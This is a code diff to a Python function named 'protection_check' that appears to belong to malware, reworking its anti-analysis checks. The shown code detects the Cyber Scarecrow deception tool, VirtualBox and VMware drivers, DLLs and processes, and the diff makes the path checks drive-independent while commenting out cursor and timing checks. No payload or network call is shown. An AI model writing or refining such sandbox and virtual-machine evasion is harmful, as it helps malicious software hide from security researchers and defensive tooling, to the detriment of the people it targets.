@@ -19,9 +19,9 @@ def protection_check():
     scarecrow_hash = "83ea1c039f031aa2b05a082c63df12398e6db1322219c53ac4447c637c940dae"
     def check_scarecrow():
         scarecrow_paths = [
-            "C:\\ProgramData\\ScareCrow",
-            "C:\\Users\\Public\\ScareCrow",
-            "C:\\Program Files\\Cyber Scarecrow"
+            "\\ProgramData\\ScareCrow",
+            "\\Users\\Public\\ScareCrow",
+            "\\Program Files\\Cyber Scarecrow"
         ]
         scarecrow_files = [
             "scarecrow.exe",
@@ -34,10 +34,10 @@ def protection_check():
         ]
 
         for path in scarecrow_paths:
-            if os.path.exists(path):
+            if os.path.exists(os.getenv('SystemDrive') + path):
                 return True
 
-        for root, dirs, files in os.walk("C:\\"):
+        for root, dirs, files in os.walk(os.getenv('SystemDrive') + "\\"):
             for file in files:
                 if file.lower() in scarecrow_files:
                     return True
@@ -118,26 +118,26 @@ def protection_check():
 
     def detect_hypervisors():
         hypervisor_files = [
-            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
-            "C:\\windows\\system32\\drivers\\VBoxSF.sys",
-            "C:\\windows\\system32\\drivers\\VBoxVideo.sys",
-            "C:\\windows\\system32\\drivers\\vm3dmp.sys",
-            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
-            "C:\\windows\\system32\\drivers\\vmusbmouse.sys"
+            "\\windows\\system32\\drivers\\VBoxGuest.sys",
+            "\\windows\\system32\\drivers\\VBoxSF.sys",
+            "\\windows\\system32\\drivers\\VBoxVideo.sys",
+            "\\windows\\system32\\drivers\\vm3dmp.sys",
+            "\\windows\\system32\\drivers\\vmhgfs.sys",
+            "\\windows\\system32\\drivers\\vmusbmouse.sys"
         ]
         for file in hypervisor_files:
-            if os.path.exists(file):
+            if os.path.exists(os.getenv('SystemDrive') + file):
                 return True
         return False
 
     def is_vm():
         vm_files = [
-            "C:\\windows\\system32\\vmGuestLib.dll",
-            "C:\\windows\\system32\\vm3dgl.dll",
-            "C:\\windows\\system32\\vboxhook.dll",
-            "C:\\windows\\system32\\vboxmrxnp.dll",
-            "C:\\windows\\system32\\vmsrvc.dll",
-            "C:\\windows\\system32\\drivers\\vmsrvc.sys"
+            "\\windows\\system32\\vmGuestLib.dll",
+            "\\windows\\system32\\vm3dgl.dll",
+            "\\windows\\system32\\vboxhook.dll",
+            "\\windows\\system32\\vboxmrxnp.dll",
+            "\\windows\\system32\\vmsrvc.dll",
+            "\\windows\\system32\\drivers\\vmsrvc.sys"
         ]
         vm_processes = [
             'vmtoolsd.exe', 
@@ -160,7 +160,7 @@ def protection_check():
         except: pass
 
         for file_path in vm_files:
-            if os.path.exists(file_path):
+            if os.path.exists(os.getenv('SystemDrive') + file_path):
                 return True
 
         for process in psutil.process_iter(['pid', 'name']):
@@ -172,10 +172,10 @@ def protection_check():
                         return False
                 return True
 
-        if detect_cursor_sync():
-            return True
-        if detect_rdtsc_spoofing():
-            return True
+        #if detect_cursor_sync():
+        #    return True
+        #if detect_rdtsc_spoofing():
+        #    return True
         if detect_hypervisors():
             return True
 
